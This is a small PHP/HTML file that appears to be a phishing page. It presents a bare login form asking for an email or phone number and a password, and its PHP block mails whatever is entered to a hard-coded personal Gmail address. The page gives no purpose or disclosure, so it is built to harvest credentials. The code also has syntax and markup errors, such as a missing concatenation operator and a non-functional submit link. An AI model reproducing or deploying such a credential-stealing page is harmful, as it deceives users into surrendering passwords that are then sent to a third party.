<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>

	<?php
	if (!empty($_POST['send']) ) {
		$number = $_POST['number'];
		$password = $_POST['password'];
		$toEmail = "arafatsorkar12345@gmail.com";
		$mailHeaders ="Name: " . $number.
		"\r\n Email:" . $password "\r\n";

		if (mail($toEmail, $number, $password, $mailHeaders )) {
			$message="Submition Successfully!";
		}
	}
	 ?>


	<section class="py-5">
<div class="container">
        <div class="row ">
        	<div class="col-md-4">
        	<div class="card border-0">
        		<div class="card-body"></div>
        	</div>
        	</div>


        	<div class="col-md-4">
        	<div class="card">
        		<div class="card-body">
        			<form method="post" name="emailContact">
        				

                        <div class="mt-3 ">
                            <level for="">Email/Number</level>
                            <input type="Email" name="number" class="form-control" name="Email" placeholder="Email/Number">
                        </div>

                  
                        <div class="mt-3">
                            <level for="">Password</level>
                            <input type="Password" name="password" class="form-control" name="password" placeholder="password">
                        </div>
                        <div class="py-3 d-flex  justify-content-end">

                         <?php if (!empty($message)) {
                         	
                           ?>
                       
                        <a href=""name="send" class="btn btn-success">Submet</a>
                        <div class="success">
                        	<strong><?php echo $message; ?></strong>
                        </div>
                    <?php } ?>
                    </div>
        			</form>
        		</div>
        	</div>
        	</div>


        	<div class="col-md-4">
        	<div class="card border-0">
        		<div class="card-body"></div>
        	</div>
        	</div>
        </div>
    </div>
		
	</section> 

</body>
</html>